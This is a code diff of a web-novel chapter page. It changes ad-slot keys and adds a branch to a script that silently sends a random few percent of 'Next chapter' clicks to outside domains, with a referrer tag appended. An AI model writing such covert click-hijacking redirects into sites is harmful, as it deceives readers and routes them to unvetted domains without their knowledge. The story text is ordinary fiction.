@@ -2401,7 +2401,7 @@
                 <p>&#34;Yes.&#34;</p>
                 <p>&#34;Good. At least we won&#39;t be starving ghosts.&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
+                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
                 <p>&#34;...&#34;</p>
                 <p>Hearing this, Mia&#39;s tears flowed even more violently.</p>
                 <p>&#34;Wah... Brother, but I don&#39;t want to die yet! Wah...&#34;</p>
@@ -2433,7 +2433,7 @@
                 <p>Meanwhile, at the entrance of the Truman estate, the small group there was completely stunned.</p>
                 <p>The sports car&#39;s speed was terrifyingly fast.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="efe7f98e0ca1646a355ba304f74f4034"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>In the blink of an eye, it had roared past them and onto the highway.</p>
                 <p>There was no time to react.</p>
                 <p>They had even seen the sports car execute a dangerously sharp drift on a curve.</p>
@@ -2449,7 +2449,7 @@
                 <p>&#34;What are you doing? You&#39;re not thinking of trying to save them, are you? I know, saving them would secure the cooperation. But we don&#39;t need to go that far! Besides, that&#39;s a sports car. How could your car possibly catch up?&#34;</p>
                 <p>Evelyn didn&#39;t answer.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
                 <p>She simply pushed Natalie&#39;s hand away.</p>
                 <p>She slammed the car door shut with a bang.</p>
                 <p>Natalie immediately began frantically knocking on the window.</p>
@@ -2465,7 +2465,7 @@
                 <p>Terrified, she pulled out her phone and called Alexander Vance.</p>
                 <p>&#34;Come quickly! Something&#39;s happened to Evelyn!&#34;</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="38fc9e7d0106734f83ac62f5d7d93253"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>After hanging up, her face was full of anxiety.</p>
                 <p>Beside her, Cecilia Evans, though frightened, ultimately saw Sebastian and Mia as strangers.</p>
                 <p>She didn&#39;t care about them.</p>
@@ -2485,7 +2485,7 @@
                 <p>Mia was baffled.</p>
                 <p>What??</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
             </div>
             
             <div class="font-controls">
@@ -2607,7 +2607,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2623,8 +2623,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
